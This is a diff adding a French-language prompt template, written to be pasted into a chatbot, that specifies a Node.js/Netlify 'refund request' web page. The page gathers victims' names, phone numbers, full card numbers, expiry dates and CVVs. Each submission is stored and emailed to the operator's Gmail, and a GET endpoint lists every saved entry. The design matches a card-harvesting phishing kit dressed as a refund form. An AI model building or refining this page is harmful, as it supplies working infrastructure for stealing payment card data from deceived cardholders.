@@ -1,0 +1,66 @@
+=== MESSAGE A DONNER AU CHATBOT ===
+
+Cree un projet Node.js de page de demande de remboursement avec :
+
+1. Structure :
+   /public/index.html
+   /public/style.css
+   /public/script.js
+   /server.js
+   /netlify/functions/remboursement.js
+   /netlify.toml
+   /.env
+
+2. Page HTML (index.html) :
+   - Titre : "Demande de remboursement"
+   - 2 étapes (bouton Continuer)
+   - Etape 1 : Champs "Nom complet" et "Numero de telephone"
+   - Etape 2 : Champs "Numero de carte" (16 chiffres), "Nom du titulaire du compte", "Mois et annee" (type month), "CVV" (3 chiffres)
+   - Bouton "Envoyer la demande"
+
+3. Script JS (script.js) :
+   - Validation cote client
+   - Numero de carte : exactement 16 chiffres (autorise les espaces)
+   - CVV : exactement 3 chiffres
+   - Envoi POST a /api/remboursement en JSON
+   - Affichage message de succes ou erreur
+   - Auto-remplir nom du titulaire depuis le nom complet
+
+4. Serveur (server.js) :
+   - Express, CORS, nodemailer
+   - POST /api/remboursement : valide les champs, sauvegarde dans data/demandes.json, envoie email
+   - GET * sert index.html
+   - Email HTML avec toutes les infos
+
+5. Netlify function (netlify/functions/remboursement.js) :
+   - POST : valide et sauvegarde dans /tmp/demandes.json, envoie email via nodemailer
+   - GET : retourne les demandes sauvegardees
+   - Variables d'env : RECEIVER_EMAIL, SMTP_HOST, SMTP_PORT, SMTP_USER, SMTP_PASS
+
+6. netlify.toml :
+   [[redirects]]
+     from = "/api/remboursement"
+     to = "/.netlify/functions/remboursement"
+     status = 200
+   [[redirects]]
+     from = "/*"
+     to = "/index.html"
+     status = 200
+
+7. .env :
+   RECEIVER_EMAIL=monemail@gmail.com
+   SMTP_HOST=smtp.gmail.com
+   SMTP_PORT=587
+   SMTP_USER=monemail@gmail.com
+   SMTP_PASS=mon-mot-de-passe-d-application
+
+8. Couleurs / style moderne bleu fonce
+
+9. Le formulaire envoie a /api/remboursement
+   Pour le deploiement local : "npm start" lance server.js
+   Pour le deploiement Netlify : fonction serverless dans netlify/functions/
+
+=== FIN DU MESSAGE ===
+
+Tu peux modifier les champs ou le design en ajoutant tes instructions apres ce message.
+Exemple : "remplace CVV par Code postal" ou "change le bleu en vert"
